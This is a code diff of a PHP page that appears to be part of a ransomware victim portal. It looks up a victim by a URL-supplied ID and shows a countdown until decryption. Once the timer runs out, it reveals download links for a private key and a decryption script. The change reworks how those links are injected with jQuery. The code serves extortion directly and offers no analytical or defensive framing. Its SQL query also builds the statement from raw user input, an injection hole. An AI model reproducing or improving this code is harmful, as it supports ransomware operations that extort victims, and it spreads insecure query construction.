@@ -27,15 +27,19 @@ $timestamp = $dateTimestamp->format('Y-m-d H:i:s');
 
 if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
    $uniqueID = $_GET['unique_id'];
-   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
+   $sql = "SELECT timediff(paid_count, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
    $result = $conn->query($sql);
 
    if ($result->num_rows > 0) {
       while ($row = $result->fetch_assoc()) {
          if ($row['time_left'] < "00:00:01") {
-            echo "<center><a href=\"" +  $_SERVER['SERVER_NAME'] + "/" + $uniqueID + "/priv.pem\">Private Key Download</a></center>";
-            echo "<br /><ber />";
-            echo "<center><a href=\"" +  $_SERVER['SERVER_NAME'] + "/downloads/decrypto.sh\">Decryption Software Download</a></center>";
+            echo "<script>" . "\n";
+            echo "   $(document).ready(function() {" . "\n";
+            echo "      $('#title').hide();" . "\n";
+            echo "      $('#new_title').append(\"<center><font color=\'green\'><h3>Download Links</h3></font></center>\");" . "\n";
+            echo "      $('#show_timer').append(\"<center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/priv.pem\'>Private Key Download</a></center><br /><br /><center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/decrypto.sh\'>Decryption Software Download</a></center>\");" . "\n";
+            echo "   });" . "\n";
+            echo "</script>" . "\n";
          } else {
             echo "<script>" . "\n";
             echo "   $(document).ready(function() {" . "\n";
@@ -44,7 +48,7 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
             echo "         $('#show_timer').html(result);" . "\n";
             echo "       });" . "\n";
             echo "     }, 1000);" . "\n";
-            echo "  });" . "\n";
+            echo "   });" . "\n";
             echo "</script>" . "\n";
          }
       }
@@ -61,7 +65,10 @@ $conn->close();
           <td>
             <h1>
               <font color="green">
-                Time Remaining Until Decryption Possible:
+                <div id="title">
+                  Time Remaining Until Decryption Possible:
+                </div>
+                <div id="new_title"></div>
                 <br /><br />
               </font>
             </h1>
